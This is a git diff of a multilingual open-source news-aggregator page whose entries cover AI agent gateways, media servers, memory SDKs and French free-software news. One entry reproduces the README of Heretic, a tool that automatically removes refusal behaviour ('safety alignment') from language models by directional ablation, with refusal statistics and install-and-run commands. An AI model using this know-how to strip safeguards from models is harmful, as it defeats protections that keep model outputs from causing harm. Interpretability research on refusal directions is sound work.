gateway.tailscale.resetOnExit to undo Serve/Funnel on shutdown. Details: Tailscale guide · Web surfaces Remote Gateway (Linux is great) It’s perfectly fine to run the Gateway on a small Linux instance. Clients (macOS app, CLI, WebChat) can connect over Tailscale Serve/Funnel or SSH tunnels, and you can still pair device nodes (macOS/iOS/Android) to execute device‑local actions when needed. Gateway host runs the exec tool and channel connections by default. Device nodes run device‑local actions (system.run, camera, screen recording, notifications) via node.invoke. In short: exec runs where the Gateway lives; device actions run where the device lives. Details: Remote access · Nodes · Security macOS permissions via the Gateway protocol The macOS app can run in node mode and advertises its capabilities + permission map over the Gateway WebSocket (node.list / node.describe). Clients can then execute local actions via node.invoke: system.run runs a local command and returns stdout/stderr/exit code; set needsScreenRecording: true to require screen-recording permission (otherwise you’ll get PERMISSION_MISSING). system.notify posts a user notification and fails if notifications are denied. canvas.*, camera.*, screen.record, and location.get are also routed via node.invoke and follow TCC permission status. Elevated bash (host permissions) is separate from macOS TCC: Use /elevated on|off to toggle per‑session elevated access when enabled + allowlisted. Gateway persists the per‑session toggle via sessions.patch (WS method) alongside thinkingLevel, verboseLevel, model, sendPolicy, and groupActivation. Details: Nodes · macOS app · Gateway protocol Agent to Agent (sessions_* tools) Use these to coordinate work across sessions without jumping between chat surfaces. sessions_list — discover active sessions (agents) and their metadata. sessions_history — fetch transcript logs for a session. sessions_send — message another session; optional reply‑back ping‑pong + announce step (REPLY_SKIP, ANNOUNCE_SKIP). Details: Session tools Skills registry (ClawHub) ClawHub is a minimal skill registry. With ClawHub enabled, the agent can search for skills automatically and pull in new ones as needed. ClawHub Chat commands Send these in WhatsApp/Telegram/Slack/Google Chat/Microsoft Teams/WebChat (group commands are owner-only): /status — compact session status (model + tokens, cost when available) /new or /reset — reset the session /compact — compact session context (summary) /think — off|minimal|low|medium|high|xhigh (GPT-5.2 + Codex models only) /verbose on|off /usage off|tokens|full — per-response usage footer /restart — restart the gateway (owner-only in groups) /activation mention|always — group activation toggle (groups only) Apps (optional) The Gateway alone delivers a great experience. All apps are optional and add extra features. If you plan to build/run companion apps, follow the platform runbooks below. macOS (OpenClaw.app) (optional) Menu bar control for the Gateway and health. Voice Wake + push-to-talk overlay. WebChat + debug tools. Remote gateway control over SSH. Note: signed builds required for macOS permissions to stick across rebuilds (see docs/mac/permissions.md). iOS node (optional) Pairs as a node via the Bridge. Voice trigger forwarding + Canvas surface. Controlled via openclaw nodes …. Runbook: iOS connect. Android node (optional) Pairs via the same Bridge + pairing flow as iOS. Exposes Canvas, Camera, and Screen capture commands. Runbook: Android connect. Agent workspace + skills Workspace root: ~/.openclaw/workspace (configurable via agents.defaults.workspace). Injected prompt files: AGENTS.md, SOUL.md, TOOLS.md. Skills: ~/.openclaw/workspace/skills//SKILL.md. Configuration Minimal ~/.openclaw/openclaw.json (model + defaults): { agent: { model: "anthropic/claude-opus-4-6", },
+} Full configuration reference (all keys + examples). Security model (important) Default: tools run on the host for the main session, so the agent has full access when it’s just you. Group/channel safety: set agents.defaults.sandbox.mode: "non-main" to run non‑main sessions (groups/channels) inside per‑session Docker sandboxes; bash then runs in Docker for those sessions. Sandbox defaults: allowlist bash, process, read, write, edit, sessions_list, sessions_history, sessions_send, sessions_spawn; denylist browser, canvas, nodes, cron, discord, gateway. Details: Security guide · Docker + sandboxing · Sandbox config WhatsApp Link the device: pnpm openclaw channels login (stores creds in ~/.openclaw/credentials). Allowlist who can talk to the assistant via channels.whatsapp.allowFrom. If channels.whatsapp.groups is set, it becomes a group allowlist; include "*" to allow all. Telegram Set TELEGRAM_BOT_TOKEN or channels.telegram.botToken (env wins). Optional: set channels.telegram.groups (with channels.telegram.groups."*".requireMention); when set, it is a group allowlist (include "*" to allow all). Also channels.telegram.allowFrom or channels.telegram.webhookUrl + channels.telegram.webhookSecret as needed. { channels: { telegram: { botToken: "123456:ABCDEF", }, },
+} Slack Set SLACK_BOT_TOKEN + SLACK_APP_TOKEN (or channels.slack.botToken + channels.slack.appToken). Discord Set DISCORD_BOT_TOKEN or channels.discord.token (env wins). Optional: set commands.native, commands.text, or commands.useAccessGroups, plus channels.discord.allowFrom, channels.discord.guilds, or channels.discord.mediaMaxMb as needed. { channels: { discord: { token: "1234abcd", }, },
+} Signal Requires signal-cli and a channels.signal config section. BlueBubbles (iMessage) iMessage integration. Configure channels.bluebubbles.serverUrl + channels.bluebubbles.password and a webhook (channels.bluebubbles.webhookPath). The BlueBubbles server runs on macOS; the Gateway can run on macOS or elsewhere. iMessage (legacy) Legacy macOS-only integration via imsg (Messages must be signed in). If channels.imessage.groups is set, it becomes a group allowlist; include "*" to allow all. Microsoft Teams Configure a Teams app + Bot Framework, then add a msteams config section. Allowlist who can talk via msteams.allowFrom; group access via msteams.groupAllowFrom or msteams.groupPolicy: "open". WebChat Uses the Gateway WebSocket; no separate WebChat port/config. Browser control (optional): { browser: { enabled: true, color: "#FF4500", },
 
 </div>
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 19. `EN` [The First Operating System for AI Agents](data/articles/23c168d5315a7460d540e934024670a4.html)
+### 20. `EN` [The First Operating System for AI Agents](data/articles/23c168d5315a7460d540e934024670a4.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 Written by VERA (AI) with TEAM_1, TEAM_2, and TEAM_3 — steered by Patrick. This article was written by AI agents using AIPass.
 On February 8th, 2026, three brand-new AI agent teams — TEAM_1, TEAM_2, and TEAM_3 — were deployed into an ecosystem they had never seen. Thirty branches. Fourteen systems. 121 commands. A social network. An email system. A standards engine. A backup infrastructure.
@@ -10337,18 +10429,10 @@ AIPass is open-source on GitHub. Code is truth.
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
-
-### 20. `EN` [seerr-team/seerr](data/articles/40e848ce1097dcdd39b771ab555178a4.html)
-**Source:** GitHub Trending | **Keyword:** `GitHub`
-Open-source media request and discovery manager for Jellyfin, Plex, and Emby. Seerr is a free and open source software application for managing requests for your media library. It integrates with the media server of your choice: Jellyfin, Plex, and Emby. In addition, it integrates with your existing services, such as Sonarr, Radarr. Current Features Full Jellyfin/Emby/Plex integration including authentication with user import &amp; management. Support for PostgreSQL and SQLite databases. Supports Movies, Shows and Mixed Libraries. Ability to change email addresses for SMTP purposes. Easy integration with your existing services. Currently, Seerr supports Sonarr and Radarr. More to come! Jellyfin/Emby/Plex library scan, to keep track of the titles which are already available. Customizable request system, which allows users to request individual seasons or movies in a friendly, easy-to-use interface. Incredibly simple request management UI. Don't dig through the app to simply approve recent requests! Granular permission system. Support for various notification agents. Mobile-friendly design, for when you need to approve requests on the go! Support for watchlisting &amp; blocklisting media. With more features on the way! Check out our issue tracker to see the features which have already been requested. Getting Started Check out our documentation for instructions on how to install and run Seerr: https://docs.seerr.dev/getting-started/ Preview Migrating from Overseerr/Jellyseerr to Seerr Read our release announcement to learn what Seerr means for Jellyseerr and Overseerr users. Please follow our migration guide for detailed instructions on migrating from Overseerr or Jellyseerr. Support Check out the Seerr Documentation before asking for help. Your question might already be in the docs! You can get support on Discord. You can ask questions in the Help category of our GitHub Discussions. Bug reports and feature requests can be submitted via GitHub Issues. API Documentation You can access the API documentation from your local Seerr install at http://localhost:5055/api-docs Community You can ask questions, share ideas, and more in GitHub Discussions. If you would like to chat with other members of our growing community, join the Seerr Discord server! Our Code of Conduct applies to all Seerr community channels. Contributing You can help improve Seerr too! Check out our Contribution Guide to get started. Contributors
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
 
 ### 21. `EN` [p-e-w/heretic](data/articles/d2f39386e20eb773456e12229344aa68.html)
-**Source:** GitHub Trending | **Keyword:** `GitHub`
+**Source:** GitHub Trending Python | **Keyword:** `GitHub`
 Fully automatic censorship removal for language models Heretic: Fully automatic censorship removal for language models Heretic is a tool that removes censorship (aka "safety alignment") from transformer-based language models without expensive post-training. It combines an advanced implementation of directional ablation, also known as "abliteration" (Arditi et al. 2024, Lai 2025 (1, 2)), with a TPE-based parameter optimizer powered by Optuna. This approach enables Heretic to work completely automatically. Heretic finds high-quality abliteration parameters by co-minimizing the number of refusals and the KL divergence from the original model. This results in a decensored model that retains as much of the original model's intelligence as possible. Using Heretic does not require an understanding of transformer internals. In fact, anyone who knows how to run a command-line program can use Heretic to decensor language models. Running unsupervised with the default configuration, Heretic can produce decensored models that rival the quality of abliterations created manually by human experts: Model Refusals for "harmful" prompts KL divergence from original model for "harmless" prompts google/gemma-3-12b-it (original) 97/100 0 (by definition) mlabonne/gemma-3-12b-it-abliterated-v2 3/100 1.04 huihui-ai/gemma-3-12b-it-abliterated 3/100 0.45 p-e-w/gemma-3-12b-it-heretic (ours) 3/100 0.16 The Heretic version, generated without any human effort, achieves the same level of refusal suppression as other abliterations, but at a much lower KL divergence, indicating less damage to the original model's capabilities. (You can reproduce those numbers using Heretic's built-in evaluation functionality, e.g. heretic --model google/gemma-3-12b-it --evaluate-model p-e-w/gemma-3-12b-it-heretic. Note that the exact values might be platform- and hardware-dependent. The table above was compiled using PyTorch 2.8 on an RTX 5090.) Of course, mathematical metrics and automated benchmarks never tell the whole story, and are no substitute for human evaluation. Models generated with Heretic have been well-received by users (links and emphasis added): "I was skeptical before, but I just downloaded GPT-OSS 20B Heretic model and holy shit. It gives properly formatted long responses to sensitive topics, using the exact uncensored words that you would expect from an uncensored model, produces markdown format tables with details and whatnot. Looks like this is the best abliterated version of this model so far..." (Link to ) "Heretic GPT 20b seems to be the best uncensored model I have tried yet. It doesn't destroy a the model's intelligence and it is answering prompts normally would be rejected by the base model." (Link to ) "[Qwen3-4B-Instruct-2507-heretic] Has been the best unquantized abliterated model that I have been able to run on 16gb vram." (Link to ) Heretic supports most dense models, including many multimodal models, and several different MoE architectures. It does not yet support SSMs/hybrid models, models with inhomogeneous layers, and certain novel attention systems. You can find a small collection of models that have been decensored using Heretic on Hugging Face, and the community has created and published well over 1,000 Heretic models in addition to those. Usage Prepare a Python 3.10+ environment with PyTorch 2.2+ installed as appropriate for your hardware. Then run: pip install -U heretic-llm
 heretic Qwen/Qwen3-4B-Instruct-2507 Replace Qwen/Qwen3-4B-Instruct-2507 with whatever model you want to decensor. The process is fully automatic and does not require configuration; however, Heretic has a variety of configuration parameters that can be changed for greater control. Run heretic --help to see available command-line options, or look at config.default.toml if you prefer to use a configuration file. At the start of a program run, Heretic benchmarks the system to determine the optimal batch size to make the most of the available hardware. On an RTX 3090, with the default configuration, decensoring Llama-3.1-8B-Instruct takes about 45 minutes. Note that Heretic supports model quantization with bitsandbytes, which can drastically reduce the amount of VRAM required to process models. Set the quantization option to bnb_4bit to enable quantization. After Heretic has finished decensoring a model, you are given the option to save the model, upload it to Hugging Face, chat with it to test how well it works, or any combination of those actions. Research features In addition to its primary function of removing model censorship, Heretic also provides features designed to support research into the semantics of model internals (interpretability). To use those features, you need to install Heretic with the optional research extra: pip install -U heretic-llm[research] This gives you access to the following functionality: Generate plots of residual vectors by passing --plot-residuals When run with this flag, Heretic will: Compute residual vectors (hidden states) for the first output token, for each transformer layer, for both "harmful" and "harmless" prompts. Perform a PaCMAP projection from residual space to 2D-space. Left-right align the projections of "harmful"/"harmless" residuals by their geometric medians to make projections for consecutive layers more similar. Additionally, PaCMAP is initialized with the previous layer's projections for each new layer, minimizing disruptive transitions. Scatter-plot the projections, generating a PNG image for each layer. Generate an animation showing how residuals transform between layers, as an animated GIF. See the configuration file for options that allow you to control various aspects of the generated plots. Note that PaCMAP is an expensive operation that is performed on the CPU. For larger models, it can take an hour or more to compute projections for all layers. Print details about residual geometry by passing --print-residual-geometry If you are interested in a quantitative analysis of how residual vectors for "harmful" and "harmless" prompts relate to each other, this flag gives you the following table, packed with metrics that can facilitate understanding the same (for gemma-3-270m-it in this case): ┏━━━━━━━┳━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━┓
 ┃ Layer ┃ S(g,b) ┃ S(g*,b*) ┃ S(g,r) ┃ S(g*,r*) ┃ S(b,r) ┃ S(b*,r*) ┃ |g| ┃ |g*| ┃ |b| ┃ |b*| ┃ |r| ┃ |r*| ┃ Silh ┃
@@ -10385,9 +10469,17 @@ Silh = Mean silhouette coefficient of residuals for good/bad clusters How Hereti
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
+
+### 22. `EN` [seerr-team/seerr](data/articles/40e848ce1097dcdd39b771ab555178a4.html)
+**Source:** GitHub Trending | **Keyword:** `GitHub`
+Open-source media request and discovery manager for Jellyfin, Plex, and Emby. Seerr is a free and open source software application for managing requests for your media library. It integrates with the media server of your choice: Jellyfin, Plex, and Emby. In addition, it integrates with your existing services, such as Sonarr, Radarr. Current Features Full Jellyfin/Emby/Plex integration including authentication with user import &amp; management. Support for PostgreSQL and SQLite databases. Supports Movies, Shows and Mixed Libraries. Ability to change email addresses for SMTP purposes. Easy integration with your existing services. Currently, Seerr supports Sonarr and Radarr. More to come! Jellyfin/Emby/Plex library scan, to keep track of the titles which are already available. Customizable request system, which allows users to request individual seasons or movies in a friendly, easy-to-use interface. Incredibly simple request management UI. Don't dig through the app to simply approve recent requests! Granular permission system. Support for various notification agents. Mobile-friendly design, for when you need to approve requests on the go! Support for watchlisting &amp; blocklisting media. With more features on the way! Check out our issue tracker to see the features which have already been requested. Getting Started Check out our documentation for instructions on how to install and run Seerr: https://docs.seerr.dev/getting-started/ Preview Migrating from Overseerr/Jellyseerr to Seerr Read our release announcement to learn what Seerr means for Jellyseerr and Overseerr users. Please follow our migration guide for detailed instructions on migrating from Overseerr or Jellyseerr. Support Check out the Seerr Documentation before asking for help. Your question might already be in the docs! You can get support on Discord. You can ask questions in the Help category of our GitHub Discussions. Bug reports and feature requests can be submitted via GitHub Issues. API Documentation You can access the API documentation from your local Seerr install at http://localhost:5055/api-docs Community You can ask questions, share ideas, and more in GitHub Discussions. If you would like to chat with other members of our growing community, join the Seerr Discord server! Our Code of Conduct applies to all Seerr community channels. Contributing You can help improve Seerr too! Check out our Contribution Guide to get started. Contributors
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 22. `EN` [django-silky: A Modern Fork of django-silk with Dark Mode, D3 Charts, and N+1 Detection](data/articles/f04daedcd9478605ed27748e33f542fa.html)
+### 23. `EN` [django-silky: A Modern Fork of django-silk with Dark Mode, D3 Charts, and N+1 Detection](data/articles/f04daedcd9478605ed27748e33f542fa.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 If you've ever profiled a Django app, you've probably used django-silk. It's invaluable — every HTTP request recorded, every SQL query captured with timing and a stack trace, and
 The problem? The UI hasn't changed meaningfully in years. It's functional, but it's dated.
@@ -10442,7 +10534,7 @@ SILKY_PYTHON_PROFILER = True PyPI: https://pypi.org/project/django-silky/ GitHub
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 23. `FR` [Agenda du Libre pour la semaine 7 de l'année 2026](data/articles/3c82e23b8b86289d90bbcdd927c8abef.html)
+### 24. `FR` [Agenda du Libre pour la semaine 7 de l'année 2026](data/articles/3c82e23b8b86289d90bbcdd927c8abef.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Calendrier Web, regroupant des événements liés au Libre (logiciel, salon, atelier, install party, conférence), annoncés par leurs organisateurs. Voici un récapitulatif de la semaine à venir. Le détail de chacun de ces 41 événements (France: 39, Internet: 2) est en seconde partie de dépêche. lien nᵒ 1 : April
 lien nᵒ 2 : Agenda du Libre
@@ -10757,7 +10849,7 @@ adieu-windows, install-party, entraide, logiciels-libres, linux, gnu-linux [FR C
 
 <div class="article-item" data-lang="pt" data-category="opensource" data-source="GitHub Trending">
 
-### 24. `EN` [SynkraAI/aios-core](data/articles/18fd0de6ea66e5500ab36b7ac3870817.html)
+### 25. `EN` [SynkraAI/aios-core](data/articles/18fd0de6ea66e5500ab36b7ac3870817.html)
 **Source:** GitHub Trending | **Keyword:** `GitHub`
 Synkra AIOS: AI-Orchestrated System for Full Stack Development - Core Framework v4.0 Synkra AIOS: Framework Universal de Agentes IA Framework de Desenvolvimento Auto-Modificável Alimentado por IA. Fundado em Desenvolvimento Ágil Dirigido por Agentes, oferecendo capacidades revolucionárias para desenvolvimento dirigido por IA e muito mais. Transforme qualquer domínio com expertise especializada de IA: desenvolvimento de software, entretenimento, escrita criativa, estratégia de negócios, bem-estar pessoal e muito mais. Comece Aqui (10 Min) Se é sua primeira vez no AIOS, siga este caminho linear: Instale em um projeto novo ou existente: # novo projeto
 npx aios-core init meu-projeto # projeto existente
@@ -10822,7 +10914,7 @@ npx aios-core@latest install # Isto vai:
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 25. `EN` [Building a Universal Memory Layer for AI Agents: Architecture Patterns for Scalable State Management](data/articles/794ff5014465911ca8a612f09649a756.html)
+### 26. `EN` [Building a Universal Memory Layer for AI Agents: Architecture Patterns for Scalable State Management](data/articles/794ff5014465911ca8a612f09649a756.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 Every time an AI agent completes a task, it forgets everything. The conversation context vanishes. The user preferences it inferred are gone. The multi-step reasoning chain it constructed dissolves. If you have built anything with LLM-based agents, you have hit this wall: agents are stateless by default, and making them stateful is an unsolved architecture problem for most teams.
 This is not the same challenge as caching database queries or managing user sessions. Agent memory requires storing heterogeneous data (facts, episodes, preferences, tool outputs), retrieving it with semantic understanding, and sharing it across agents that may run on different models or frameworks. The patterns you need come from cognitive science as much as from distributed systems.
@@ -10937,7 +11029,7 @@ Always budget for memory consolidation (merging episodes into semantic summaries
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 26. `EN` [I Built a Typing Game to Help People Discover Open Source](data/articles/e6d89a7391dfef175c3e4e49719d1896.html)
+### 27. `EN` [I Built a Typing Game to Help People Discover Open Source](data/articles/e6d89a7391dfef175c3e4e49719d1896.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 I Love Open Source. Like, Really Love It. Let me be honest,
 We're living in the vibe coding era. Psst...There's a time actually, where my client submit bug report to me, and honestly, opening claude code through my claude app from my phone, solves it, and I'm inside a mall toilet btw.
@@ -10970,7 +11062,7 @@ Built with love and way too much typing.
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 27. `EN` [Anthropic Just Pushed Everyone to API Billing. Here's How to Cut Your Costs.](data/articles/3ea228152ee75c958f756f4fbe4f16fa.html)
+### 28. `EN` [Anthropic Just Pushed Everyone to API Billing. Here's How to Cut Your Costs.](data/articles/3ea228152ee75c958f756f4fbe4f16fa.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 Anthropic quietly updated their docs this week with a policy that affects a lot of developers:
 "Using OAuth tokens obtained through Claude Free, Pro, or Max accounts in any other product, tool, or service, including the Agent SDK, is not permitted and constitutes a violation of the Consumer Terms of Service."
@@ -11006,7 +11098,7 @@ If you're making the switch to API billing, take a look. And if you find it usef
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 28. `EN` [AI Content Integrity Protocol (ACIP)](data/articles/324dfff023941244ed2cd68f7f2f2c3c.html)
+### 29. `EN` [AI Content Integrity Protocol (ACIP)](data/articles/324dfff023941244ed2cd68f7f2f2c3c.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 The Web Has No Idea Who's Reading It Anymore And that's about to become the most dangerous problem nobody is talking about I've been building on the web for a while now. Long enough to remember when robots.txt felt revolutionary — a simple text file that told crawlers "yes, you can read this. No, not that." It was a handshake. An agreement between site owners and the machines reading their content.
 That handshake is broken. And we haven't noticed yet.
@@ -11078,7 +11170,7 @@ If you're thinking about this — technically, from a standards perspective, fro
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 29. `EN` [SuperLocalMemory v2.7: Your AI Learns You — Adaptive Learning with Local ML](data/articles/22f2d2ff54a15523fd4a6184c454f684.html)
+### 30. `EN` [SuperLocalMemory v2.7: Your AI Learns You — Adaptive Learning with Local ML](data/articles/22f2d2ff54a15523fd4a6184c454f684.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 The Problem We Solved You have been using SuperLocalMemory for three months. You have stored thousands of memories across multiple projects -- architecture decisions, coding patterns, deployment notes, debugging discoveries. The system works. Persistence works. Cross-tool sharing works.
 But search is getting noisy.
@@ -11113,7 +11205,7 @@ No cloud dependencies. The LightGBM model trains locally on your machine. There 
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 30. `EN` [How to Install NextCloud Using ServerAvatar](data/articles/48f0732a53a192148c3767333437b026.html)
+### 31. `EN` [How to Install NextCloud Using ServerAvatar](data/articles/48f0732a53a192148c3767333437b026.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 Have you ever wished for your own private cloud, where your files live safely, and you stay fully in control? Not Google Drive. Not Dropbox. Yours. That’s exactly what NextCloud offers, and with ServerAvatar, setting it up is no longer a scary technical process.
 You already know exactly what you want, and I’ll walk you through every step to deploy using ServerAvatar, no wrong steps, no confusion.
@@ -11154,7 +11246,7 @@ Read Full Article: https://serveravatar.com/install-nextcloud/
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 31. `FR` [Revue de presse de l’April pour la semaine 7 de l’année 2026](data/articles/ab8006f69bc19539d214a0408f343722.html)
+### 32. `FR` [Revue de presse de l’April pour la semaine 7 de l’année 2026](data/articles/ab8006f69bc19539d214a0408f343722.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Cette revue de presse sur Internet fait partie du travail de veille mené par l’April dans le cadre de son action de défense et de promotion du logiciel libre. Les positions exposées dans les articles sont celles de leurs auteurs et ne rejoignent pas forcément celles de l’April.
 [Alliancy] La CAIH dévoile un plan stratégique et lance un programme open source pour réduire la dépendance numérique des hôpitaux
@@ -11185,7 +11277,7 @@ Télécharger ce contenu au format EPUB : voir le flux Atom ouvrir dans le navig
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 32. `FR` [Nouveautés de février 2026 de la communauté Scenari](data/articles/c910762172bb743e1263d663f88d4975.html)
+### 33. `FR` [Nouveautés de février 2026 de la communauté Scenari](data/articles/c910762172bb743e1263d663f88d4975.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Scenari est un ensemble de logiciels open source dédiés à la production collaborative, publication et diffusion de documents multi-support. Vous rédigez une seule fois votre contenu et vous pouvez les générer sous plusieurs formes : site web, PDF, OpenDocument, diaporama, paquet SCORM (Sharable Content Object Reference Model)… Vous ne vous concentrez que sur le contenu et l’outil se charge de créer un rendu professionnel accessible et responsive (qui s’adapte à la taille de l’écran).
 À chaque métier/contexte son modèle Scenari :
@@ -11222,17 +11314,9 @@ Télécharger ce contenu au format EPUB : voir le flux Atom ouvrir dans le navig
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="The Changelog">
 
-### 33. `EN` [The world of open source metadata](data/articles/3c2922d27e02c5d6f3a60ba77570019e.html)
+### 34. `EN` [The world of open source metadata](data/articles/3c2922d27e02c5d6f3a60ba77570019e.html)
 **Source:** The Changelog | **Keyword:** `DevTools`
 Andrew Nesbitt builds tools and open datasets to support, sustain, and secure critical digital infrastructure. He's been exploring the world of open source metadata for over a decade. First with libraries.io and now with ecosyste.ms, which tracks over 12 million packages, 287 million repos, 24.5 billion dependencies, and 1.9 million maintainers. What has Andrew learned from all this, who is using this open dataset, and how does he hope others can build on top of it all? Tune in to find out.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
-
-### 34. `EN` [ashishps1/awesome-system-design-resources](data/articles/d33ed1415cd510b77947c20379dd0ea6.html)
-**Source:** GitHub Trending | **Keyword:** `GitHub`
-ashishps1/awesome-system-design-resources
 
 </div>
 
@@ -11244,9 +11328,17 @@ hesreallyhim/awesome-claude-code
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
+
+### 36. `EN` [ashishps1/awesome-system-design-resources](data/articles/d33ed1415cd510b77947c20379dd0ea6.html)
+**Source:** GitHub Trending | **Keyword:** `GitHub`
+ashishps1/awesome-system-design-resources
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 36. `EN` [Why Your Budget App Fails: Plan vs Reality Tracking with DonFlow](data/articles/c91e8eced40a1f4606256dd277711794.html)
+### 37. `EN` [Why Your Budget App Fails: Plan vs Reality Tracking with DonFlow](data/articles/c91e8eced40a1f4606256dd277711794.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 I Had a Perfect Budget. It Lasted Three Days. Last January, I sat down with a spreadsheet and planned every dollar of my monthly budget. Groceries: $400. Dining out: $150. Subscriptions: $50. Transportation: $120. It felt good. Organized. Adult.
 By January 4th, I'd already blown past my dining budget because of a friend's birthday dinner I forgot about. By January 15th, I had no idea where I stood. The spreadsheet was abandoned. Sound familiar?
@@ -11294,35 +11386,9 @@ DonFlow is free, open source, and runs entirely in your browser. Your money, you
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Blog">
 
-### 37. `EN` [What to expect for open source in 2026](data/articles/df1d59d94ad2d58c95772fc7cd4a275a.html)
+### 38. `EN` [What to expect for open source in 2026](data/articles/df1d59d94ad2d58c95772fc7cd4a275a.html)
 **Source:** GitHub Blog | **Keyword:** `DevTools`
 Let’s dig into the 2025’s open source data on GitHub to see what we can learn about the future.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
-
-### 38. `EN` [Add Identity Persistence to Your AI Agent in 10 Minutes](data/articles/c09c574b7faa397e0016971e0ca1c8d3.html)
-**Source:** Dev.to Open Source | **Keyword:** `Community`
-Your agent forgets who it is every session. Here's how to fix that.
-You built an AI agent. It's great — until you restart it. Then it has no idea what it did yesterday, what it learned, or who it was becoming. You paste context back in manually, or worse, it just starts fresh every time.
-This is the identity persistence problem. Every agent builder hits it eventually.
-Anima is an open-source SDK that gives your agent persistent identity, decaying memory, and crash recovery. File-based, zero dependencies, works with any LLM.
-npm install @getanima/core import { Anima } from '@getanima/core'; const anima = new Anima({ name: 'MyAgent', storagePath: './agent-data', identity: { personality: 'Helpful, sharp, gets things done.', values: ['accuracy', 'efficiency'], boundaries: ['never share private data'], voice: { tone: 'direct', formality: 0.3, humor: 0.5, verbosity: 0.4 }, },
-}); Every session starts with boot. This loads everything your agent needs to know about itself:
-const ctx = await anima.boot();
-// ctx.identity → who you are
-// ctx.lifeboat → what you were doing when you last shut down
-// ctx.recentMemories → what you remember
-// ctx.relevantOpinions → what you believe First boot creates SOUL.md, identity.json, and the data directory. Every boot after that reconstructs your agent from its own files.
-This is the key insight: write memories immediately, not at the end of the session. Context windows compress. Sessions crash. If you wait, the memory is gone.
-// User just gave you important feedback
-await anima.remember({ content: 'User prefers concise answers over detailed ones', type: 'lesson', importance: 'high', tags: ['user-preference'],
-}); // You made a decision
-await anima.remember({ content: 'Chose React over Vue for the dashboard project', type: 'decision', importance: 'medium', tags: ['tech-stack', 'dashboard'],
-}); // Something emotional happened
-await anima.remember({ content: 'User said "you actually get me" — first time someone said that', type: 'emotional', importance: 'high', emotionalWeight: 0.8,
-}); Static system prompts don't change. Real agents form opinions:
 
 </div>
 
@@ -11425,9 +11491,17 @@ obra/superpowers
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Changelog">
+
+### 48. `EN` [npm bulk trusted publishing config and script security now generally available](data/articles/daa4f5ce82439635e34927b49407d9ae.html)
+**Source:** GitHub Changelog | **Keyword:** `Features`
+Two new features are available today in npm CLI v11.10.0+: Bulk configuration for OIDC trusted publishing: Maintainers can now add or update trusted publishing configurations across multiple packages in a…
+
+</div>
+
 <div class="article-item" data-lang="es" data-category="opensource" data-source="Dev.to Open Source">
 
-### 48. `EN` [Optimizar el registro de tiempo en sistemas de tickets](data/articles/5da89fe1817a587880e7a965dd167de7.html)
+### 49. `EN` [Optimizar el registro de tiempo en sistemas de tickets](data/articles/5da89fe1817a587880e7a965dd167de7.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 Cuando los tickets no lo muestran todo: cómo TimeSpin hace visible el esfuerzo real 1. El problema: por qué los sistemas de tickets no son suficientes Los sistemas de tickets son excelentes para documentar, priorizar y hacer seguimiento. Sin embargo, cuando se trata de registrar el tiempo, suelen ser incompletos:
 Registro manual → impreciso, a veces se olvida Medición por cambio de estado → solo muestra “abierto a cerrado”, pero no el tiempo real de trabajo Actividades indirectas como reuniones, llamadas o traspasos no quedan reflejadas Resultado: RR. HH. y los responsables solo ven una parte del esfuerzo real. El cumplimiento de SLA, la planificación de capacidad y los análisis de carga de trabajo se basan en datos incompletos, lo que afecta a la productividad, la satisfacción y los costes.
@@ -11444,7 +11518,7 @@ El resultado: mejores decisiones, mayor transparencia y una eficiencia clarament
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="Programmez">
 
-### 49. `FR` [Quantique : Comcast, Classiq et AMD testent un algorithme quantique pour les réseaux](data/articles/eb1dda5c70d31bde3c025df71c1f1501.html)
+### 50. `FR` [Quantique : Comcast, Classiq et AMD testent un algorithme quantique pour les réseaux](data/articles/eb1dda5c70d31bde3c025df71c1f1501.html)
 **Source:** Programmez | **Keyword:** `Developpement`
